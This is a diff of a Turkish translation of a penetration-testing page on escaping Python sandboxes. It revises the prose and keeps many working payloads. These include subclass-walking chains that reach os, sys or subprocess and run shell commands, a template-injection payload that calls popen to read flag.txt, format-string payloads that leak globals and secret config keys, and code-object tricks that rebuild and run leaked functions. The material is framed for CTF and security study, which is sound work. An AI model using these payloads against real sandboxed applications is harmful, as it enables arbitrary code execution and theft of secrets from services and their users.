'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
 ```
-[**Aşağıda daha büyük bir fonksiyon**](./#recursive-search-of-builtins-globals) bulunmaktadır, burada **global değişkenleri** bulabileceğiniz onlarca/**yüzlerce yer** bulunmaktadır.
+[**Aşağıda daha büyük bir fonksiyon**](./#recursive-search-of-builtins-globals) **bulabileceğiniz onlarca/yüzlerce yer** bulmak için.
 
-## Keyfi Yürütme Keşfetme
+## Keyfi Yürütme Keşfi
 
-Burada, daha tehlikeli işlevlerin nasıl kolayca keşfedileceğini ve daha güvenilir saldırılar önerileceğini açıklamak istiyorum.
+Burada, **daha tehlikeli işlevlerin yüklendiğini kolayca keşfetmenin** ve daha güvenilir saldırıları önermenin nasıl olduğunu açıklamak istiyorum.
 
-#### Geçişlerle alt sınıflara erişim
+#### Atlatmalarla alt sınıflara erişme
 
-Bu teknikte en hassas olanlardan biri, **temel alt sınıflara erişebilmektir**. Önceki örneklerde bunu `''.__class__.__base__.__subclasses__()` kullanarak yapmıştık, ancak **başka mümkün yollar** da vardır:
+Bu teknikte en hassas kısımlardan biri, **temel alt sınıflara erişebilmektir**. Önceki örneklerde bunu `''.__class__.__base__.__subclasses__()` kullanarak yapmıştık ancak **başka mümkün yollar** da vardır:
 ```python
 #You can access the base from mostly anywhere (in regular conditions)
 "".__class__.__base__.__subclasses__()
@@ -651,18 +451,18 @@ defined_func.__class__.__base__.__subclasses__()
 (''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(132)|attr('__init__')|attr('__globals__')|attr('__getitem__')('popen'))('cat+flag.txt').read()
 (''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(1)|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(132)|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('popen'))('cat+flag.txt').read()
 ```
-### Tehlikeli kütüphanelerin bulunması
+### Tehlikeli kütüphanelerin yüklenmesini bulma
 
-Örneğin, **`sys`** kütüphanesiyle **keyfi kütüphaneler içe aktarılabilir** olduğunu bildiğinizde, içinde **sys içe aktarılmış olan tüm yüklenmiş modülleri** arayabilirsiniz:
+Örneğin, **`sys`** kütüphanesi ile **keyfi kütüphanelerin yüklenebileceğini** bildiğinizde, içinde **sys** kütüphanesini içe aktaran tüm **yüklenmiş modülleri** arayabilirsiniz:
 ```python
 [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ]
 ['_ModuleLock', '_DummyModuleLock', '_ModuleLockManager', 'ModuleSpec', 'FileLoader', '_NamespacePath', '_NamespaceLoader', 'FileFinder', 'zipimporter', '_ZipImportResourceReader', 'IncrementalEncoder', 'IncrementalDecoder', 'StreamReaderWriter', 'StreamRecoder', '_wrap_close', 'Quitter', '_Printer', 'WarningMessage', 'catch_warnings', '_GeneratorContextManagerBase', '_BaseExitStack', 'Untokenizer', 'FrameSummary', 'TracebackException', 'CompletedProcess', 'Popen', 'finalize', 'NullImporter', '_HackedGetData', '_localized_month', '_localized_day', 'Calendar', 'different_locale', 'SSLObject', 'Request', 'OpenerDirector', 'HTTPPasswordMgr', 'AbstractBasicAuthHandler', 'AbstractDigestAuthHandler', 'URLopener', '_PaddedFile', 'CompressedValue', 'LogRecord', 'PercentStyle', 'Formatter', 'BufferingFormatter', 'Filter', 'Filterer', 'PlaceHolder', 'Manager', 'LoggerAdapter', '_LazyDescr', '_SixMetaPathImporter', 'MimeTypes', 'ConnectionPool', '_LazyDescr', '_SixMetaPathImporter', 'Bytecode', 'BlockFinder', 'Parameter', 'BoundArguments', 'Signature', '_DeprecatedValue', '_ModuleWithDeprecations', 'Scrypt', 'WrappedSocket', 'PyOpenSSLContext', 'ZipInfo', 'LZMACompressor', 'LZMADecompressor', '_SharedFile', '_Tellable', 'ZipFile', 'Path', '_Flavour', '_Selector', 'JSONDecoder', 'Response', 'monkeypatch', 'InstallProgress', 'TextProgress', 'BaseDependency', 'Origin', 'Version', 'Package', '_Framer', '_Unframer', '_Pickler', '_Unpickler', 'NullTranslations']
 ```
-Bunların birçok çeşidi var ve **sadece bir tanesine ihtiyacımız var** komutları çalıştırmak için:
+Çok fazla var, ve **sadece bir tanesine ihtiyacımız var** komutları yürütmek için:
 ```python
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
 ```
-Aynı şeyi **diğer kütüphanelerle** yapabiliriz, bu kütüphaneler komutları **yürütmek** için kullanılabileceğini bildiğimiz kütüphanelerdir:
+Aynı şeyi yapabiliriz, sadece **diğer kütüphanelerle** biliriz ki **komutları yürütmek** için kullanılabilir:
 ```python
 #os
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" in x.__init__.__globals__ ][0]["os"].system("ls")
@@ -697,7 +497,7 @@ Aynı şeyi **diğer kütüphanelerle** yapabiliriz, bu kütüphaneler komutlar�
 #pdb
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pdb" in x.__init__.__globals__ ][0]["pdb"].os.system("ls")
 ```
-Ayrıca, kötü amaçlı kütüphaneleri yükleyen modülleri bile arayabiliriz:
+Ayrıca, hangi modüllerin kötü amaçlı kütüphaneleri yüklediğini bile araştırabiliriz:
 ```python
 bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
 for b in bad_libraries_names:
@@ -716,7 +516,7 @@ builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalE
 pdb:
 """
 ```
-Ayrıca, eğer **diğer kütüphanelerin** komutları çalıştırmak için **fonksiyonları çağırabileceğini düşünüyorsanız**, olası kütüphanelerin içindeki fonksiyon isimlerine göre de **filtreleme yapabiliriz**:
+Ayrıca, eğer **diğer kütüphanelerin** de **komutları yürütmek için fonksiyonları çağırabileceğini düşünüyorsanız**, olası kütüphanelerin içindeki fonksiyon isimlerine göre de **filtreleme yapabiliriz**:
 ```python
 bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
 bad_func_names = ["system", "popen", "getstatusoutput", "getoutput", "call", "Popen", "spawn", "import_module", "__import__", "load_source", "execfile", "execute", "__builtins__"]
@@ -747,12 +547,11 @@ load_source: NullImporter, _HackedGetData
 execfile:
 execute:
 __builtins__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, DynamicClassAttribute, _GeneratorWrapper, WarningMessage, catch_warnings, Repr, partialmethod, singledispatchmethod, cached_property, _GeneratorContextManagerBase, _BaseExitStack, Completer, State, SubPattern, Tokenizer, Scanner, Untokenizer, FrameSummary, TracebackException, _IterationGuard, WeakSet, _RLock, Condition, Semaphore, Event, Barrier, Thread, CompletedProcess, Popen, finalize, _TemporaryFileCloser, _TemporaryFileWrapper, SpooledTemporaryFile, TemporaryDirectory, NullImporter, _HackedGetData, DOMBuilder, DOMInputSource, NamedNodeMap, TypeInfo, ReadOnlySequentialNamedNodeMap, ElementInfo, Template, Charset, Header, _ValueFormatter, _localized_month, _localized_day, Calendar, different_locale, AddrlistClass, _PolicyBase, BufferedSubFile, FeedParser, Parser, BytesParser, Message, HTTPConnection, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, Address, Group, HeaderRegistry, ContentManager, CompressedValue, _Feature, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, Queue, _PySimpleQueue, HMAC, Timeout, Retry, HTTPConnection, MimeTypes, RequestField, RequestMethods, DeflateDecoder, GzipDecoder, MultiDecoder, ConnectionPool, CharSetProber, CodingStateMachine, CharDistributionAnalysis, JapaneseContextAnalysis, UniversalDetector, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, DSAParameterNumbers, DSAPublicNumbers, DSAPrivateNumbers, ObjectIdentifier, ECDSA, EllipticCurvePublicNumbers, EllipticCurvePrivateNumbers, RSAPrivateNumbers, RSAPublicNumbers, DERReader, BestAvailableEncryption, CBC, XTS, OFB, CFB, CFB8, CTR, GCM, Cipher, _CipherContext, _AEADCipherContext, AES, Camellia, TripleDES, Blowfish, CAST5, ARC4, IDEA, SEED, ChaCha20, _FragList, _SSHFormatECDSA, Hash, SHAKE128, SHAKE256, BLAKE2b, BLAKE2s, NameAttribute, RelativeDistinguishedName, Name, RFC822Name, DNSName, UniformResourceIdentifier, DirectoryName, RegisteredID, IPAddress, OtherName, Extensions, CRLNumber, AuthorityKeyIdentifier, SubjectKeyIdentifier, AuthorityInformationAccess, SubjectInformationAccess, AccessDescription, BasicConstraints, DeltaCRLIndicator, CRLDistributionPoints, FreshestCRL, DistributionPoint, PolicyConstraints, CertificatePolicies, PolicyInformation, UserNotice, NoticeReference, ExtendedKeyUsage, TLSFeature, InhibitAnyPolicy, KeyUsage, NameConstraints, Extension, GeneralNames, SubjectAlternativeName, IssuerAlternativeName, CertificateIssuer, CRLReason, InvalidityDate, PrecertificateSignedCertificateTimestamps, SignedCertificateTimestamps, OCSPNonce, IssuingDistributionPoint, UnrecognizedExtension, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _OpenSSLError, Binding, _X509NameInvalidator, PKey, _EllipticCurve, X509Name, X509Extension, X509Req, X509, X509Store, X509StoreContext, Revoked, CRL, PKCS12, NetscapeSPKI, _PassphraseHelper, _CallbackExceptionHelper, Context, Connection, _CipherContext, _CMACContext, _X509ExtensionParser, DHPrivateNumbers, DHPublicNumbers, DHParameterNumbers, _DHParameters, _DHPrivateKey, _DHPublicKey, Prehashed, _DSAVerificationContext, _DSASignatureContext, _DSAParameters, _DSAPrivateKey, _DSAPublicKey, _ECDSASignatureContext, _ECDSAVerificationContext, _EllipticCurvePrivateKey, _EllipticCurvePublicKey, _Ed25519PublicKey, _Ed25519PrivateKey, _Ed448PublicKey, _Ed448PrivateKey, _HashContext, _HMACContext, _Certificate, _RevokedCertificate, _CertificateRevocationList, _CertificateSigningRequest, _SignedCertificateTimestamp, OCSPRequestBuilder, _SingleResponse, OCSPResponseBuilder, _OCSPResponse, _OCSPRequest, _Poly1305Context, PSS, OAEP, MGF1, _RSASignatureContext, _RSAVerificationContext, _RSAPrivateKey, _RSAPublicKey, _X25519PublicKey, _X25519PrivateKey, _X448PublicKey, _X448PrivateKey, Scrypt, PKCS7SignatureBuilder, Backend, GetCipherByName, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, RawJSON, JSONDecoder, JSONEncoder, Cookie, CookieJar, MockRequest, MockResponse, Response, BaseAdapter, UnixHTTPConnection, monkeypatch, JSONDecoder, JSONEncoder, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
-"""
 ```
-## Yerleşik Fonksiyonlar, Global Değişkenlerin Yinelemeli Araması...
+## Yinelemeli Arama Yapısı: Builtins, Globals...
 
 {% hint style="warning" %}
-Bu gerçekten **harika**. Eğer **globals, builtins, open veya herhangi bir nesne** gibi bir nesne arıyorsanız, bu betiği kullanarak **bu nesneyi bulabileceğiniz yerleri yinelemeli olarak bulabilirsiniz**.
+Bu sadece **harika**. Eğer **globals, builtins, open veya herhangi bir nesne arıyorsanız**, bu betiği kullanarak **bu nesneyi bulabileceğiniz yerleri yinelemeli olarak bulabilirsiniz.**
 {% endhint %}
 ```python
 import os, sys # Import these to find more gadgets
@@ -871,25 +670,17 @@ main()
 ```
 Bu betiğin çıktısını bu sayfada kontrol edebilirsiniz:
 
-{% content-ref url="broken-reference" %}
-[Kırık bağlantı](broken-reference)
+{% content-ref url="broken-reference/" %}
+[broken-reference](broken-reference/)
 {% endcontent-ref %}
 
-<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
+## Python Biçim Dizesi
 
-En önemli güvenlik açıklarını bulun, böylece daha hızlı düzeltebilirsiniz. Intruder saldırı yüzeyinizi takip eder, proaktif tehdit taramaları yapar, API'lerden web uygulamalarına ve bulut sistemlerine kadar tüm teknoloji yığınınızda sorunları bulur. [**Ücretsiz deneyin**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) bugün.
-
-{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
-
-***
-
-## Python Format Dizisi
-
-Python'a **biçimlendirilecek bir dize** gönderirseniz, **python dahili bilgilerine** erişmek için `{}` kullanabilirsiniz. Örneğin, globals veya builtins'e erişmek için önceki örnekleri kullanabilirsiniz.
+Eğer python'a **biçimlendirilecek bir dize gönderirseniz**, `{}` kullanarak **python iç bilgilerine erişebilirsiniz**. Örneğin, globals veya builtins'e erişmek için önceki örnekleri kullanabilirsiniz.
 
 {% hint style="info" %}
-Ancak, bir **sınırlama** vardır, yalnızca `.[]` sembollerini kullanabilirsiniz, bu nedenle keyfi kodu yürütemezsiniz, yalnızca bilgi okuyabilirsiniz.\
-_**Bu güvenlik açığı aracılığıyla kodu nasıl yürüteceğinizi biliyorsanız, lütfen benimle iletişime geçin.**_
+Ancak, bir **kısıtlama** bulunmaktadır, yalnızca `.[]` sembollerini kullanabilirsiniz, bu nedenle **keyfi kodları yürütemezsiniz**, yalnızca bilgi okuyabilirsiniz.\
+_**Bu zafiyet aracılığıyla kod yürütme konusunda bilgi sahibiyseniz, lütfen benimle iletişime geçin.**_
 {% endhint %}
 ```python
 # Example from https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/
@@ -910,16 +701,16 @@ people = PeopleInfo('GEEKS', 'FORGEEKS')
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
 get_name_for_avatar(st, people_obj = people)
 ```
-Normal bir şekilde nokta ile `people_obj.__init__` gibi **özelliklere erişebileceğinizi** ve **parantezlerle** tırnak işareti olmadan `__globals__[CONFIG]` gibi **sözlük öğelerine** erişebileceğinizi unutmayın.
+Dikkat edin ki bir nesnenin özelliklerine **nokta** ile normal bir şekilde erişebilirsiniz, örneğin `people_obj.__init__`, ve **parantez** içinde tırnak olmadan **sözlük elemanlarına** erişebilirsiniz, `__globals__[CONFIG]`
 
-Ayrıca, nesnenin öğelerini numaralandırmak için `.__dict__` kullanabileceğinizi unutmayın `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`
+Ayrıca bir nesnenin elemanlarını numaralandırmak için `.__dict__` kullanabilirsiniz, `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`
 
-Biçim dizelerinden diğer ilginç özellikler, belirtilen nesnede **`str`**, **`repr`** ve **`ascii`** fonksiyonlarını **yürütme** olasılığıdır. Bunun için **`!s`**, **`!r`**, **`!a`** eklemeniz gerekmektedir:
+Biçim dizelerinden diğer ilginç özelliklerden biri, belirtilen nesnede **`str`**, **`repr`** ve **`ascii`** fonksiyonlarını **`!s`**, **`!r`**, **`!a`** ekleyerek **çalıştırma** olasılığıdır:
 ```python
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]!a}"
 get_name_for_avatar(st, people_obj = people)
 ```
-Ayrıca, sınıflarda **yeni biçimlendiriciler kodlamak** mümkündür:
+Ayrıca, sınıflarda **yeni biçimleyiciler kodlamak mümkündür**:
 ```python
 class HAL9000(object):
 def __format__(self, format):
@@ -933,14 +724,14 @@ return 'HAL 9000'
 **Daha fazla örnek** **format** **dizisi** örnekleri [**https://pyformat.info/**](https://pyformat.info) adresinde bulunabilir.
 
 {% hint style="danger" %}
-Ayrıca, aşağıdaki sayfada Python dahili nesnelerinden **hassas bilgileri okuyan** araçlar için cihazları kontrol edin:
+Ayrıca, Python dahili nesnelerden **duyarlı bilgileri okuyacak** araçlar için aşağıdaki sayfayı da kontrol edin:
 {% endhint %}
 
 {% content-ref url="../python-internal-read-gadgets.md" %}
 [python-internal-read-gadgets.md](../python-internal-read-gadgets.md)
 {% endcontent-ref %}
 
-### Hassas Bilgi Açığa Çıkarma Yükleri
+### Duyarlı Bilgi Açığını Ortaya Çıkaran Yükler
 ```python
 {whoami.__class__.__dict__}
 {whoami.__globals__[os].__dict__}
@@ -954,12 +745,12 @@ Ayrıca, aşağıdaki sayfada Python dahili nesnelerinden **hassas bilgileri oku
 ## Python Nesnelerini İnceleme
 
 {% hint style="info" %}
-Python bytecode hakkında derinlemesine bilgi edinmek isterseniz, bu konuyla ilgili harika bir yazıyı okuyun: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
+Python bytecode hakkında derinlemesine bilgi edinmek istiyorsanız, bu konu hakkında harika bir yazıyı okuyun: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
 {% endhint %}
 
-Bazı CTF'lerde, bayrağın bulunduğu **özel bir fonksiyonun adı** size verilebilir ve bunu çıkarmak için fonksiyonun **iç yapısını** görmek zorunda kalabilirsiniz.
+Bazı CTF'lerde, bayrağın bulunduğu özel bir fonksiyonun adı verilebilir ve bayrağı çıkarmak için fonksiyonun iç yapısını görmek gerekebilir.
 
-İncelemek için bu fonksiyonu kullanın:
+İncelenmesi gereken fonksiyon:
 ```python
 def get_flag(some_input):
 var1=1
@@ -971,22 +762,6 @@ else:
 return "Nope"
 ```
 #### dir
-
-`dir` is a built-in function in Python that returns a list of names in the current local scope or a specified object's attributes.
-
-In Python, every object has a set of attributes that define its behavior and properties. The `dir` function allows you to explore these attributes and get a better understanding of how an object works.
-
-To use the `dir` function, you simply pass the object as an argument. For example:
-
-```python
-dir(object)
-```
-
-This will return a list of attribute names associated with the object. You can then use this information to access and manipulate the object's attributes.
-
-Keep in mind that the `dir` function only returns the names of the attributes, not their values. To access the values, you will need to use the appropriate syntax for the specific attribute.
-
-Overall, the `dir` function is a useful tool for exploring and understanding the attributes of Python objects. It can be particularly helpful when working with unfamiliar libraries or modules, as it allows you to quickly see what attributes are available and how to interact with them.
 ```python
 dir() #General dir() to find what we have loaded
 ['__builtins__', '__doc__', '__name__', '__package__', 'b', 'bytecode', 'code', 'codeobj', 'consts', 'dis', 'filename', 'foo', 'get_flag', 'names', 'read', 'x']
@@ -995,7 +770,7 @@ dir(get_flag) #Get info tof the function
 ```
 #### globals
 
-`__globals__` ve `func_globals` (Aynı) global ortamı elde eder. Örnekte, bazı içe aktarılan modüller, bazı global değişkenler ve içerikleri görülebilir:
+`__globals__` ve `func_globals` (Aynı) Global ortamı elde eder. Örnekte, bazı içe aktarılan modülleri, bazı global değişkenleri ve içeriklerini görebilirsiniz:
 ```python
 get_flag.func_globals
 get_flag.__globals__
@@ -1004,11 +779,11 @@ get_flag.__globals__
 #If you have access to some variable value
 CustomClassObject.__class__.__init__.__globals__
 ```
-[**Daha fazla yer için buraya bakın**](./#globals-and-locals)
+[**Daha fazla global değişken elde etmek için buraya bakın**](./#globals-and-locals)
 
 ### **Fonksiyon koduna erişim**
 
-**`__code__`** ve `func_code`: Fonksiyonun bu **özelliğine erişebilirsiniz** ve fonksiyonun **kod nesnesini elde edebilirsiniz**.
+**`__code__`** ve `func_code`: Fonksiyonun bu **özelliğine erişebilirsiniz** ve fonksiyonun kod nesnesini **elde edebilirsiniz**.
 ```python
 # In our current example
 get_flag.__code__
@@ -1023,20 +798,6 @@ dir(get_flag.__code__)
 ['__class__', '__cmp__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__le__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'co_argcount', 'co_cellvars', 'co_code', 'co_consts', 'co_filename', 'co_firstlineno', 'co_flags', 'co_freevars', 'co_lnotab', 'co_name', 'co_names', 'co_nlocals', 'co_stacksize', 'co_varnames']
 ```
 ### Kod Bilgisi Almak
-
-Python kodunu çalıştırmadan önce, kodun içeriğini ve davranışını anlamak önemlidir. Bu, kodun ne yapabileceğini ve potansiyel güvenlik risklerini belirlemek için gereklidir. İşte kod hakkında bilgi edinmenin bazı yolları:
-
-- **Kodun İçeriğini İnceleme**: Kodu dikkatlice okuyun ve ne yaptığını anlamaya çalışın. Değişkenlerin nasıl kullanıldığını, döngülerin ve koşullu ifadelerin nasıl çalıştığını anlamak önemlidir.
-
-- **Dökümantasyonu Okuma**: Kodun dökümantasyonunu okuyun. Bu, kodun nasıl kullanılması gerektiği, hangi parametrelerin kabul edildiği ve hangi çıktıların döndürüldüğü gibi bilgileri içerebilir.
-
-- **Modül ve Fonksiyonlar Hakkında Bilgi Edinme**: Kullanılan modüllerin ve fonksiyonların belgelerini okuyun. Bu, modül veya fonksiyonun ne yaptığı, hangi parametreleri kabul ettiği ve hangi çıktıları döndürdüğü gibi bilgileri içerebilir.
-
-- **Kodun İzini Sürme**: Kodu izlemek için print ifadeleri ekleyebilirsiniz. Bu, kodun hangi adımları izlediğini ve hangi değerleri kullandığını gösterir.
-
-- **Kodun Analizi**: Kodu statik analiz araçlarıyla inceleyebilirsiniz. Bu araçlar, kodun potansiyel güvenlik açıklarını tespit etmek için kullanılabilir.
-
-Kod hakkında bilgi edinmek, kodun potansiyel risklerini belirlemek ve güvenlik açıklarını tespit etmek için önemlidir. Bu bilgiler, kodu güvenli bir şekilde çalıştırmak veya potansiyel riskleri önlemek için kullanılabilir.
 ```python
 # Another example
 s = '''
@@ -1082,29 +843,7 @@ get_flag.__code__.co_freevars
 get_flag.__code__.co_code
 'd\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S'
 ```
-### **Bir fonksiyonu disassemble etmek**
-
-Bir Python fonksiyonunu disassemble etmek, fonksiyonun altında yatan makine kodunu incelemek için kullanılan bir tekniktir. Bu, fonksiyonun nasıl çalıştığını ve hangi adımları izlediğini anlamak için faydalı olabilir.
-
-Python'da, `dis` modülü bu işlemi gerçekleştirmek için kullanılır. Bu modül, Python bytecode'unu okuyarak ve çözerek fonksiyonun adımlarını gösteren bir çıktı sağlar.
-
-Aşağıda, bir fonksiyonu nasıl disassemble edeceğinizi gösteren bir örnek bulunmaktadır:
-
-```python
-import dis
-
-def my_function():
-    x = 5
-    y = 10
-    z = x + y
-    print(z)
-
-dis.dis(my_function)
-```
-
-Bu kodu çalıştırdığınızda, `my_function` fonksiyonunun disassembled çıktısını alırsınız. Bu çıktı, fonksiyonun her bir adımını ve ilgili bytecode'u gösterir.
-
-Disassembled çıktı, fonksiyonun altında yatan işlem mantığını anlamak için kullanılabilir. Özellikle, bir fonksiyonun nasıl çalıştığını anlamak veya bir sandık veya güvenlik mekanizması tarafından korunan bir fonksiyonu incelemek için faydalı olabilir.
+### **Fonksiyonu Ayrıştırma**
 ```python
 import dis
 dis.dis(get_flag)
@@ -1132,7 +871,7 @@ dis.dis(get_flag)
 44 LOAD_CONST               0 (None)
 47 RETURN_VALUE
 ```
-Eğer python kum havuzunda `dis` modülünü içe aktaramazsanız, fonksiyonun **bytecode**'unu (`get_flag.func_code.co_code`) elde edebilir ve yerel olarak **ayrıştırabilirsiniz**. Yüklenen değişkenlerin içeriğini (`LOAD_CONST`) görmeyeceksiniz, ancak `LOAD_CONST` değişkenin yüklenme ofsetini de belirttiği için bunları (`get_flag.func_code.co_consts`) tahmin edebilirsiniz.
+Dikkat edin ki, eğer python kum havuzunda `dis`i içe aktaramazsanız, fonksiyonun **bytecode**'unu (`get_flag.func_code.co_code`) elde edebilir ve yerel olarak **çözümleyebilirsiniz**. Yüklenen değişkenlerin içeriğini görmeyeceksiniz (`LOAD_CONST`) ancak yüklenen değişkenin ofsetini (`LOAD_CONST`) `get_flag.func_code.co_consts`den tahmin edebilirsiniz çünkü `LOAD_CONST` aynı zamanda yüklenen değişkenin ofsetini belirtir.
 ```python
 dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
 0 LOAD_CONST          1 (1)
@@ -1154,10 +893,10 @@ dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x0
 44 LOAD_CONST          0 (0)
 47 RETURN_VALUE
 ```
-## Python Derleme
+## Python Derlemesi
 
-Şimdi, bir şekilde **çalıştıramadığınız bir işlev hakkında bilgi alabilirsiniz**, ancak onu **çalıştırmanız gerekiyorsa** ne yapacağınızı bilmiyorsunuz.\
-Aşağıdaki örnekte olduğu gibi, o işlevin **kod nesnesine erişebilirsiniz**, ancak disassemble'ı okuyarak **bayrağı nasıl hesaplayacağınızı bilmezsiniz** (_daha karmaşık bir `calc_flag` işlevini hayal edin_).
+Şimdi, bir fonksiyon hakkında bilgi alabileceğinizi ancak çalıştıramayacağınızı hayal edelim, ama onu **çalıştırmanız gerekiyor**.\
+Aşağıdaki örnekte olduğu gibi, o fonksiyonun **kod nesnesine erişebilirsiniz**, ancak disassemble'ı okuyarak bayrağı nasıl hesaplayacağınızı **bilmiyorsunuz** (_daha karmaşık bir `calc_flag` fonksiyonunu hayal edin_).
 ```python
 def get_flag(some_input):
 var1=1
@@ -1172,7 +911,7 @@ return "Nope"
 ```
 ### Kod nesnesi oluşturma
 
-İlk olarak, **bir kod nesnesi oluşturmayı ve çalıştırmayı** nasıl yapacağımızı bilmemiz gerekiyor, böylece sızdırılan fonksiyonumuzu çalıştırmak için bir tane oluşturabiliriz:
+İlk olarak, **bir kod nesnesi oluşturup yürütmeyi** nasıl yapacağımızı bilmemiz gerekiyor, böylece sızdırılmış işlevimizi yürütmek için bir tane oluşturabiliriz:
 ```python
 code_type = type((lambda: None).__code__)
 # Check the following hint if you get an error in calling this
@@ -1203,7 +942,7 @@ types.CodeType.__doc__
 ### Sızdırılan bir fonksiyonun yeniden oluşturulması
 
 {% hint style="warning" %}
-Aşağıdaki örnekte, fonksiyonu doğrudan fonksiyon kodu nesnesinden yeniden oluşturmak için gereken tüm verileri alacağız. **Gerçek bir örnekte**, fonksiyonu yürütmek için gereken tüm **değerler**, **sızdırmanız gereken şeydir**.
+Aşağıdaki örnekte, fonksiyonu yeniden oluşturmak için gereken tüm verileri doğrudan fonksiyon kodu nesnesinden alacağız. **Gerçek bir örnekte**, fonksiyonu yürütmek için gereken tüm **değerlerin** sızdırmanız gereken şey olduğunu unutmayın.
 {% endhint %}
 ```python
 fc = get_flag.__code__
@@ -1215,12 +954,12 @@ mydict['__builtins__'] = __builtins__
 function_type(code_obj, mydict, None, None, None)("secretcode")
 #ThisIsTheFlag
 ```
-### Savunmaları Aşma
+### Savunmaları Atlatma
 
-Bu yazının başında verilen örneklerde, `compile` fonksiyonunu kullanarak herhangi bir Python kodunu nasıl çalıştıracağınızı görebilirsiniz. Bu ilginç çünkü bir **tek satırda** döngüler ve her şeyi içeren **tüm betikleri** çalıştırabilirsiniz (aynısını **`exec`** kullanarak da yapabilirdik).\
-Neyse ki, bazen yerel bir makinede bir **derlenmiş nesne** oluşturup onu **CTF makinesinde** çalıştırmak faydalı olabilir (örneğin, CTF'de `compile` fonksiyonuna sahip değilsek).
+Bu yazının başlangıcındaki önceki örneklerde, `compile` fonksiyonunu kullanarak **herhangi bir python kodunu nasıl çalıştıracağınızı** görebilirsiniz. Bu ilginç çünkü **döngüler ve her şeyi içeren tüm betikleri** bir **tek satırda** çalıştırabilirsiniz (ve aynısını **`exec`** kullanarak yapabilirdik).\
+Neyse ki, bazen yerel bir makinede **derlenmiş bir nesne oluşturmak** ve bunu **CTF makinesinde** çalıştırmak faydalı olabilir (örneğin, CTF'de `compile` fonksiyonuna sahip olmadığımız için).
 
-Örneğin, _./poc.py_ dosyasını okuyan ve derleyen bir işlevi manuel olarak derleyip çalıştıralım:
+Örneğin, _./poc.py_ dosyasını okuyan bir fonksiyonu manuel olarak derleyip çalıştıralım:
 ```python
 #Locally
 def read():
